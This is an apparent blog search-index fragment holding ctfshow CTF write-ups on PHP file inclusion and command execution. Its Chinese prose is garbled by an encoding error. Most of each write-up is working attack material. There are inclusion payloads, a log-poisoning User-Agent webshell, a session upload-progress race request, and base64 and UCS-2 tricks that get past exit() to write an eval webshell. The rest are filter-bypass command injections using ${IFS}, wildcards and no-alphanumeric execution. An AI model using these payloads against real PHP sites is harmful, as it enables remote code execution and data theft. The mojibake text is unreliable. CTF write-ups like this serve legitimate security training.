\n\n```\n.`åœ¨å‘½åä¸­æ˜¯ä¸åˆæ³•å‘½åä¼šè¢«è½¬ä¸º`_\n```\n\nç„¶åèƒ½åœ¨phpé…ç½®ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°flag\n\n# ç»“å°¾ï¼š\n\nè¿™ä¸ªæ¿å—å®åœ¨å¤ªå¤šäº† èŠ±äº†ä¸¤ä¸ªä¸‹åˆ å¼€å¯ä¸‹ä¸€ä¸ªå¤§é™†æ–‡ä»¶ä¸Šä¼ !\n","tags":["phpç‰¹æ€§"],"categories":["ctfshow"]},{"title":"ctfshow-æ–‡ä»¶åŒ…å«","url":"/post/ad175165.html","content":"\nctfshow-æ–‡ä»¶åŒ…å«\n\n<!--more-->\n\n# WEB-78(php://filter)\n\n```\n?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n# WEB-79(data://)\n\n```\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n# WEB-80~81(æ—¥å¿—åŒ…å«)\n\nåœ¨User-Agent:å†™å…¥ä¸€å¥è¯æœ¨é©¬\n\n```php\nGET / HTTP/1.1\nHost: bd0bccfb-0e49-4ac6-841e-dc21b2cfeecb.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: <?php system('cat fl0g.php'); ?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n```\n\nç„¶åè®¿é—®nginxæ—¥å¿—æ–‡ä»¶è·¯å¾„`?file=/var/log/nginx/access.log`\n\n# WEB-82~86(session.upload_progressæ¡ä»¶ç«äº‰)\n\nè¿™é“é¢˜ç›®åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œæ¡ä»¶ç«äº‰\n\nç›¸å…³æ–‡ç« å¯ä»¥çœ‹è¿™ç¯‡https://www.freebuf.com/vuls/202819.html\n\næ¡ä»¶:\n\n- php5.4\n- session.upload_progress.enabled=on å½“æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ phpä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯å­˜å‚¨åœ¨sessionä¸­\n- session.upload_progress.cleanup = on ä¸Šä¼ å®Œæ¯•å phpç«‹å³æ¸…ç†å¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ \n- session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\" phpä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œå¯¹æˆ‘ä»¬æœ‰ç”¨çš„æ˜¯å®ƒçš„å€¼å¯æ§\n- session.upload_progress.prefix = \"upload_progress_\" å®ƒå’Œä¸Šé¢çš„name prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å\n- session.use_strict_mode=off è¿™ä¸ªè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­çš„sessionidå¯æ§\n\né¦–å…ˆå°±æ˜¯æ²¡æœ‰session_start()æˆ‘ä»¬è¯¥æ€ä¹ˆåˆ›å»ºsessionæ–‡ä»¶\n\nsessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚  \n\næˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=flagï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š/tmp/sess_flagâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±`ini.get(\"session.upload_progress.prefix\")`+ç”±æˆ‘ä»¬æ„é€ çš„`session.upload_progress.name`å€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚  \n\nä½†æ˜¯æˆ‘ä»¬sessionæ–‡ä»¶ä¸Šä¼ åä¼šè¢«ç«‹é©¬åˆ é™¤\n\nè¿™é‡Œå°±è¦åˆ©ç”¨æ¡ä»¶ç«äº‰ ä¸€è¾¹ä¸€ç›´å‘åŒ…ä¸€è¾¹ä¸€ç›´å»è®¿é—® æ€»æœ‰ä¸€æ¬¡èƒ½è®¿é—®æˆåŠŸ\n\nå› æ­¤æˆ‘ä»¬æ‰€éœ€è¦åšçš„å°±æ˜¯ï¼š\n\n1. ä¸Šä¼ æ–‡ä»¶  åœ¨Cookie=flag\n2. è¯·æ±‚åŒ…ä¸­æ·»åŠ ï¼šPHP_SESSION_UPLOAD_PROGRESSç„¶åå†…å®¹è®¾ç½®ä¸ºæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼ˆä¼šè¢«å†™å…¥sess_flagæ–‡ä»¶ä¸­ ï¼‰\n3. ä¸æ–­çš„å‘åŒ…å»æ¡ä»¶ç«äº‰\n\nå‘åŒ…postæ•°æ®åŒ…ï¼š\n\n```php\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"http://fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\nçˆ†ç ´çš„ä¸¤ä¸ªæ•°æ®åŒ…ï¼š\n\n```php\nPOST / HTTP/1.1\nHost: fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show\nContent-Length: 375\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarytKDZI1UbeWYK4Zrv\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=flag\nConnection: close\n\n------WebKitFormBoundarytKDZI1UbeWYK4Zrv\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n<?php system('cat fl0g.php');?>\n------WebKitFormBoundarytKDZI1UbeWYK4Zrv\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: application/octet-stream\n\nGIF89a\n<script language='php'>@eval($_POST[\"x\"]);</script>#è¿™é‡Œçš„å†…å®¹å¯ä»¥æ— è§† è·Ÿè¿™é“é¢˜ç›®æ— å…³ åªæ˜¯æˆ‘ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹\n\n\n\n------WebKitFormBoundarytKDZI1UbeWYK4Zrv--\nGET /?file=/tmp/sess_flag HTTP/1.1\nHost: fd963388-64d1-44dc-a324-28bdf664ad61.challenge.ctf.show\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n```\n\nå…ˆçˆ†ç ´æ–‡ä»¶ä¸Šä¼  å†çˆ†ç ´åŒ…å«çš„æ•°æ®åŒ… ä½†æ˜¯ä¸¤ä¸ªæ˜¯ä¸€èµ·çˆ†ç ´çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687933498473-c07b5203-2910-4187-8f7d-990f83ee6de7.png)\n\n# WEB-87ï¼ˆexitæ­»äº¡ç»•è¿‡ï¼‰\n\nè¿™é‡Œé¢è®²çš„å¾ˆæ¸…æ¥šhttps://xz.aliyun.com/t/8163#toc-2\n\n```\nfile_put_contents(urldecode($file), \"<?php die('å¤§ä½¬åˆ«ç§€äº†');?>\".$content);\n```\n\nå°±æ˜¯è¿™é‡Œ`<?php die('å¤§ä½¬åˆ«ç§€äº†');?>`die() è·Ÿexit()å‡½æ•°ä¸€æ ·å°±æ˜¯è„šæœ¬è¿è¡Œåˆ°è¿™é‡Œä¼šé€€å‡ºè„šæœ¬\n\nä¹Ÿå°±æ˜¯è¯´å³ä½¿æˆ‘ä»¬è¾“å…¥ä¸€å¥è¯æœ¨é©¬ æœ‰exit()å­˜åœ¨é‚£ä¹ˆæ°¸è¿œè¿è¡Œä¸åˆ°æˆ‘ä»¬çš„æœ¨é©¬å°±ä¼šæå‰é€€å‡ºè„šæœ¬\n\nè¿™é‡Œåˆ©ç”¨äº†`php://filter/write=convert.base64-decode/resource=1.php`æ³¨æ„è¿™é‡Œæ˜¯å†™å…¥\n\nå°†`$content`è§£ç  åˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤æ­»äº¡exitã€‚\n\nbase64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œå½“PHPé‡åˆ°ä¸å¯è§£ç çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©æ€§çš„è·³è¿‡\n\næ‰€ä»¥ï¼Œå½“$content åŒ…å« <?php exit; ?>æ—¶ï¼Œè§£ç è¿‡ç¨‹ä¼šå…ˆå»é™¤è¯†åˆ«ä¸äº†çš„å­—ç¬¦ï¼Œ< ; ? >å’Œç©ºæ ¼ç­‰éƒ½å°†è¢«å»é™¤ï¼Œäºæ˜¯å‰©ä¸‹çš„å­—ç¬¦å°±åªæœ‰phpexitä»¥åŠæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦äº†ã€‚ç”±äºbase64æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå†æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¾‹å¦‚æ·»åŠ å­—ç¬¦aåï¼Œå°†phpexitaå½“åšä¸¤ç»„base64è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ç»•è¿‡è¿™ä¸ªæ­»äº¡exitäº†ã€‚\n\npayloadï¼š\n\nget:\n\n`php://filter/write=convert.base64-decode/resource=1.php`å¯¹å…¶è¿›è¡Œä¸¤æ¬¡urlå…¨å­—ç¬¦ç¼–ç \n\n`?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30`å› ä¸ºä¸€æ¬¡è§£ç åœ¨æµè§ˆå™¨è§£æ ä¸€æ¬¡è§£ç åœ¨é¢˜ç›®ä¸­\n\npost:\n\n```\naaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==\n```\n\n å‰ä¸¤ä¸ªaæ˜¯ç”¨æ¥å’Œphpdieaaç»„æˆ4ä¸ªbyte ä¹Ÿå°±æ˜¯ä¸¤ç»„ ç”¨äºbase64è§£ç  ç›´æ¥å°±å¹²æ‰è¿™ä¸ªæ­»äº¡dieäº† çœŸçš„å¤ªå¼ºäº†\n\n åé¢çš„å†…å®¹æ˜¯`<?php @eval($_POST[a]);?>`base64ç¼–ç å†…å®¹\n\n# WEB-88(è¿‡æ»¤)\n\n```\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs`æ²¡æœ‰è¿‡æ»¤`:\n```\n\nè¿™é‡Œè¿˜è¦æŠŠç”¨æ¥base64è¡¥ä½çš„`==`å»æ‰å› ä¸ºwaf \n\nå› ä¸º==åªæ˜¯ç”¨æ¥è¡¥ä½çš„æ‰€ä»¥åˆ é™¤ä¸ä¼šå½±å“è§£ç æ­£å¸¸\n\n# WEB-116(Misc)\n\næä¸€å¥è§†é¢‘å‰ªè¾‘çš„ä¸é”™:)\n\nbinwalkåˆ†ç¦»å‡ºæºç \n\n```\n?file=flag.php\n```\n\n# WEB-117(exitæ­»äº¡ç»•è¿‡)\n\nå¤§è‡´æ€è·¯å’Œ87ä¸€æ · ä¸è¿‡è¿™é‡Œwafäº†base64 æ¢ç§è§£ç æ–¹å¼å°±è¡Œäº†\n\nç›´æ¥å·åˆ«äººçš„payload\n\n```\n?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\npost:contents=?<hp pvela$(P_SO[T]1;)>?\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687942245432-fcfe9ce3-7c53-4a65-a0d6-05b1887e1005.png)\n\npayloadç”±æ¥ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687943128967-696125f6-abaa-4345-af21-c3fc05850137.png)\n\n# ç»“å°¾ï¼š\n\næ–‡ä»¶åŒ…å«éš¾åº¦è¿˜è¡Œ keep hackingï¼ å¼€å¯ä¸‹ä¸€å¤§é™† phpç‰¹æ€§ ï¼\n","tags":["æ–‡ä»¶åŒ…å«"],"categories":["ctfshow"]},{"title":"ctfshow-å‘½ä»¤æ‰§è¡Œ","url":"/post/53e2b2e1.html","content":"\nctfshow-å‘½ä»¤æ‰§è¡Œ\n\n<!--more-->\n\n# WEB-32(ç»•æ‹¬å·ï¼Œåˆ†å·)\n\n includeä¸ç”¨æ‹¬å·ï¼Œåˆ†å·å¯ä»¥ç”¨`?>`ä»£æ›¿ \n\nåˆ©ç”¨æ–‡ä»¶åŒ…å«+ä¼ªåè®®\n\n```\n?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n# WEB-37(dataåè®® æ—¥å¿—åŒ…å« ç»•flag)\n\næ–‡ä»¶åŒ…å«ç”¨dataåè®®base64ç¼–ç ç»•flagæ­£åˆ™\n\n```\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n?c=data://text/palin,<?php system(\"nl fla*\");?>\n```\n\næˆ–è€…å…ˆ`/ä¸€å¥è¯æœ¨é©¬`å†æ—¥å¿—åŒ…å«  æ³¨æ„urlç¼–ç é—®é¢˜\n\n# WEB-39(æ–‡ä»¶åŒ…å«æœ‰åç¼€å¹²æ‰°)\n\n```\nc=data:text/plain,<?php system('cat f*')?>\n```\n\nå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„`.php`ä¼šè¢«å½“æˆçº¯æ–‡æœ¬ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œèµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ ã€‚\n\n\n\n# WEB-40(æ— å‚RCEæ„é€ )\n\n## è§£æ³•ä¸€\n\næ— å‚RCEæ„é€  æ ¹æ®buuä¸€é“é¢˜ç›®çš„å¥—å¨ƒæ¥åš\n\n```\n?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\nå…·ä½“å¯ä»¥çœ‹æˆ‘çš„æ–‡ç« [https://z1d10t.github.io/post/2ed7a105.html?highlight=%E5%A5%97%E5%A8%83](https://z1d10t.github.io/post/2ed7a105.html?highlight=å¥—å¨ƒ)\n\n## è§£æ³•äºŒ\n\n```\n?c=eval(array_pop(next(get_defined_vars())));\n```\n\npostä¸€ä¸ª`1=system('cmd');`\n\nget_defined_vars() â€”  è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914581610-576ad783-f44a-468d-a1db-9ea3504ffdec.png)\n\nå‘ç°æœ‰postæ•°ç»„ ç„¶åpostä¸€ä¸ªå€¼ \n\npost:`1=phpinfo();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914717308-bfe1ea46-39aa-431a-8787-202cf93239f0.png)\n\nå°†å…¶å¼¹å‡ºå¹¶ä¸”æ‰§è¡Œå°±è¡Œ è¿™é‡ŒæŒ‡é’ˆåœ¨ç¬¬ä¸€ä¸ªå…ƒç´  å°†å…¶æŒ‡å‘ç¬¬äºŒä¸ªå…ƒç´  å³æˆ‘ä»¬éœ€è¦çš„\n\narray_pop â€” å¼¹å‡ºæ•°ç»„æœ€åä¸€ä¸ªå•å…ƒï¼ˆå‡ºæ ˆï¼‰\n\nè¿™é‡Œåœ¨å¼¹å‡ºå‰ç”¨nextæŒ‡é’ˆæŒ‡å‘äº† æ‰€ä»¥å¹¶æ²¡æœ‰å¼¹å‡ºæœ€åä¸€ä¸ªå…ƒç´ ï¼Œæˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„\n\n```\n?c=print_r(array_pop(next(get_defined_vars())));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914940306-f18a0864-d4f0-4ef0-8821-1b4efce9a4cf.png)\n\nå¾—åˆ°äº†æˆ‘ä»¬éœ€è¦çš„ï¼Œç„¶åevalæ‰§è¡Œå°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682914969413-b5a38986-22d6-4b3a-8221-f1f3c97396f7.png)\n\n# WEB-41(æˆ–è¿ç®—)\n\nç›´æ¥å½“ä¸ªè„šæœ¬å°å­:)\n\nhttps://blog.csdn.net/miuzzx/article/details/108569080\n\n# WEB-42(é»‘æ´)\n\nå…·ä½“å¯ä»¥çœ‹https://www.cnblogs.com/tinywan/p/6025468.html\n\n```\nsystem($c.\" >/dev/null 2>&1\");\n```\n\nç®€å•è¯´å°±ç®—`$c`çš„å†…å®¹éƒ½ä¼šè¢«é‡å®šå‘åˆ°ä¸€ä¸ª`é»‘æ´`å°±æ˜¯æ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œç›¸å½“äºè¢«åæ‰äº†\n\né€šè¿‡`%0a,%20`æˆªæ–­ç»•è¿‡å°±è¡Œäº†\n\n# WEB-43(&&)\n\né€»è¾‘ä¸\n\nå…ˆæ‰§è¡Œå·¦è¾¹ï¼Œåªæœ‰å·¦è¾¹ä¸ºçœŸï¼Œæ‰ä¼šæ‰§è¡Œå³è¾¹\n\næ³¨æ„ä¸€ä¸‹è¿™é‡Œ`&&`è¦urlç¼–ç ä¸€ä¸‹\n\n# WEB-45(ç»•ç©ºæ ¼)\n\n```\n${IFS}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687659970129-65bd9e49-b1dd-49e3-9534-9d4e8a9fb66c.png)\n\n```\n?c=tac${IFS}fla*.php%0a\n```\n\n# WEB-46~51(é‡å®šå‘ç»•ç©ºæ ¼æ•°å­—$)\n\nå‚è€ƒï¼šhttp://c.biancheng.net/view/942.html\n\nå…³äº `2>&1`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687661520344-12e86620-a0ec-4eab-96ae-36f0e2fe760f.png)\n\n`?c=tac<fla''g.php||`æˆ–è€…nlä¹Ÿè¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687661628909-18c402c1-f11d-4e96-8a05-20f09a01bd9c.png)\n\nå°±æ˜¯å°†flag.phpä½œä¸ºtacçš„è¾“å…¥ ç„¶ååˆ©ç”¨`||`é€»è¾‘æˆ–ç»•`%0aå’Œ&&` è¾“å…¥é‡å®šå‘å»ç»•ç©ºæ ¼\n\n# WEB-51(${IFS}ç»•ç©ºæ ¼)\n\nwafäº†é‡å®šå‘ç¬¦\n\næˆ–è€…ç”¨`${IFS}æˆ–è€…$IFS` å…¶å®ä¸¤è€…æ˜¯ç›¸ç­‰çš„\n\nå…³äº`${}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687662639492-af87e7d7-6315-4d0e-814a-56a12c9c8c9a.png)\n\n```\n?c=nl${IFS}/fla?||\n?c=nl${IFS}/fla''g||\n```\n\n# WEB-53(ç©ºå­—ç¬¦ç»•ç©ºæ ¼)\n\nä¸æ˜¯ä½ è¿™ä¸ªflagæ–‡ä»¶å¤¹èƒ½ä¸èƒ½åˆ«è€æ˜¯å˜åŠ¨\n\n```\n?c=nl${IFS}/fla?\n?c=c''at${IFS}fla''g.p''hp\n```\n\n# WEB-54(ç»•æ­£åˆ™)\n\nå…³äº`.*`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687663891064-438d2f3d-60f0-4dcf-984b-458bf826542b.png)\n\nlinuxä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶ é€šè¿‡æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ åœ¨binç›®å½•ä¸‹å­˜æ”¾ç€å‘½ä»¤æ–‡ä»¶ æˆ‘ä»¬ä¸€èˆ¬è°ƒç”¨å‘½ä»¤ç³»ç»Ÿå°±ä¼šè°ƒç”¨è¿™é‡Œçš„æ–‡ä»¶ï¼ˆæˆ‘æ˜¯è¿™ä¹ˆè®¤ä¸ºçš„ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687664362024-d939184f-168b-40df-980e-66a3bc44a8fe.png)\n\n```\n?c=/bin/?at${IFS}f???????\n```\n\n?æ˜¯é€šé…ç¬¦ å»æ¨¡ç³ŠåŒ¹é…ä¸€ä¸ªå­—ç¬¦\n\n\n\n# WEB-55~56ï¼ˆæ— å­—æ¯æ•°å­—rceï¼‰\n\n## è§£æ³•ä¸€\n\nå‚è€ƒpç¥https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\n\nè®¤è¯†sourceå’Œ`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687675407237-2f98e932-ad55-4dfc-ab46-feae73f782dc.png)\n\nä¹Ÿå°±æ˜¯è¯´sourceæˆ–è€…`.`å½“ç„¶è¿™é“é¢˜ç›®åªèƒ½ç”¨`.`æ¥æ‰§è¡Œæˆ‘ä»¬æ–‡ä»¶ä¸­å‘½ä»¤ ä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬çš„æ–‡ä»¶å½“ä½œè„šæœ¬è¿è¡Œ\n\nä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘æœ¬åœ°æ²¡æ‰“é€š ä¼°è®¡æ˜¯åç»­è¿™ä¸ªæ¼æ´è¢«ä¿®å¤äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687675589848-06fa3171-78af-486d-b69b-c55822aa3a24.png)\n\né‚£ä¹ˆå°±éœ€è¦ä¸€ä¸ªåŒ…å«æˆ‘ä»¬æ¶æ„å‘½ä»¤çš„æ–‡ä»¶ ç›´æ¥æ„é€ ä¸€ä¸ªpostä¸Šä¼ çš„æ•°æ®åŒ…\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POSTæ•°æ®åŒ…POC</title>\n  </head>\n  <body>\n    <form action=\"http://ec5969bd-4909-4435-9d77-ac7ffe92bbfe.challenge.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n      <!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥-->\n      <label for=\"file\">æ–‡ä»¶åï¼š</label>\n      <input type=\"file\" name=\"file\" id=\"file\"><br>\n      <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n    </form>\n  </body>\n</html>\n```\n\nå½“æˆ‘ä»¬ä¸Šä¼ ä¸Šå»ä¹‹å PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯/tmp/phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚\n\nç„¶ååœ¨è¿›è¡Œ`.`å’Œlinuxé€šé…ç¬¦ç»„åˆæ‹³å»æ‰“\n\nè¿™é‡Œpayloadæ ¹æ®pç¥çš„æ–‡ç« `?c=. /???/????????[@-[]`è¦åˆ©ç”¨`[@-[]`å»é™åˆ¶ä¸‹æœ€åä¸€ä½ä¸ºå¤§å†™ ä¸ç„¶åŒ¹é…åˆ°å¾ˆå¤šæ–‡ä»¶æ— ç»“æœ å› æ­¤æ‰“payloadçš„æ—¶å€™æœ‰æ—¶å€™ä¼šåŒ¹é…ä¸åˆ° ç”¨bpå¤šæäº¤å‡ æ¬¡å°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676153214-1d7165a1-414b-4f05-a5e7-a0a35515255d.png)\n\néšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ ç„¶åå†…å®¹ï¼š\n\n```html\n#!/bin/sh\nls /\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676290049-2ef242ab-2c80-48ac-b72a-f7515b45b1c9.png)\n\nå½“ç„¶bashæˆ–è€…zshç­‰ç­‰éƒ½è¡Œ shellå…·ä½“è§£é‡Šå™¨éƒ½å¯ä»¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687676263096-cdd7758e-47bc-4bcd-b37a-eb3ebdded252.png)\n\n## è§£æ³•äºŒ\n\nå…¶å®ä¹Ÿæ˜¯åˆ©ç”¨é€šé…ç¬¦å»æ‰§è¡Œå‘½ä»¤æ–‡ä»¶ `?c=/???/????64 ????.???`\n\nå…¶å®å°±æ˜¯å»æ‰§è¡Œ `/bin/base64 flag.php`\n\n# WEB-57(ç‰¹æ®Šæ–¹æ³•æ„é€ æ•°å­—)\n\næ ¹æ®é¢˜ç›®flagåœ¨36.phpä¸­ é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ„é€ å‡ºæ•°å­—36å³å¯\n\né¦–å…ˆæ¥è®¤è¯†ä¸€ä¸‹`${_}å’Œ$(())`\n\n`${_}` æ˜¯ä¸€ç§ç‰¹æ®Šçš„å˜é‡ï¼Œå®ƒè¡¨ç¤ºä¸Šä¸€ä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687751963911-f92a0b8e-b2d2-4de3-a23e-203f31474246.png)\n\næ³¨æ„ä¸€ä¸‹ å¦‚æœæ²¡æœ‰ä¸Šä¸€ä¸ªå‘½ä»¤åˆ™è¡¨ç¤ºä¸ºç©º\n\n åœ¨Linuxä¸­ï¼Œ`$(())`æ˜¯ä¸€ç§ç”¨äºè¿›è¡Œæ•°å­¦è¿ç®—çš„ç‰¹æ®Šè¯­æ³•ç»“æ„ã€‚å®ƒé€šå¸¸ç”¨äºshellè„šæœ¬ä¸­ï¼Œç”¨äºæ±‚å€¼ä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼å¹¶è¿”å›ç»“æœã€‚  \n\né‚£ä¹ˆè®¡ç®—ç©ºå­—ç¬¦å°±æ˜¯0 å¯ä»¥`$((${_}))`æ‰“ç»„åˆæ‹³\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752142638-33aae5c9-3710-483e-9073-0b7d15b41663.png)\n\nè¿™æ ·å°±å¯ä»¥æ„é€ å‡ºæ•°å­—äº†\n\nå†é€šè¿‡æŒ‰ä½å–åä¸æ–­çš„æ„é€ å‡ºæ•°å­— å½“æ—¶å¯¹æŒ‰ä½å–åè¿˜æ˜¯æœ‰ç‚¹ç–‘æƒ‘ ä¸è¿‡çŸ¥ä¹ä¸Šä¸€ç¯‡ç¨¿å­è§£ç­”äº†æˆ‘çš„ç–‘æƒ‘https://zhuanlan.zhihu.com/p/161465089\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752194916-1a2ad9be-8a53-44d5-aae7-40bc5701cfb9.png)\n\n**è®¡ç®—æœºæ‰€æœ‰äºŒè¿›åˆ¶è¾“å‡ºéƒ½æ˜¯è¡¥ç çš„å½¢å¼** è¿™å¥è¯è§£ç­”äº†æˆ‘å¯¹è¡¥ç 